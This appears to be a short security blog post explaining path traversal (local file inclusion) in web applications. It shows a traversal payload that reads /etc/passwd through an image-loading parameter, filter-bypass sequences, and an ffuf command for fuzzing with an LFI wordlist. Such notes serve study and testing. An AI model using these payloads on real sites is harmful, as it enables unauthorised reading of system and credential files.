---
layout: blog
type: blog
title: Web Application Security - Local File Inclusion
permalink: blog/web-lfi
# All dates must be YYYY-MM-DD format!
date: 2021-11-15
labels:
  - fuzzing
---

## Reading arbitrary files

 Consider a shopping application that displays images of items for sale. Images are loaded via some HTML like the following:

```html
<img src="/loadImage?filename=218.png">

use
https://insecure-website.com/loadImage?filename=../../../etc/passwd
```

This causes the application to read from the following file path:

```txt
/var/www/images/../../../etc/passwd 
```

## Common obstacles

- absolute path block
- stripped sequences non-recursively: use sequences like ....// or ....\\/
- stripped sequences with URL-decode: use non-standard encodings
- validation of start of path
- 

Generally it can be fuzzed using ffuf and a wordlist like LFI_jhaddix.txt

```shell
ffuf -u "vulnerable-site.net/image?filename=FUZZ" -w LFI-Jhaddix.txt
```
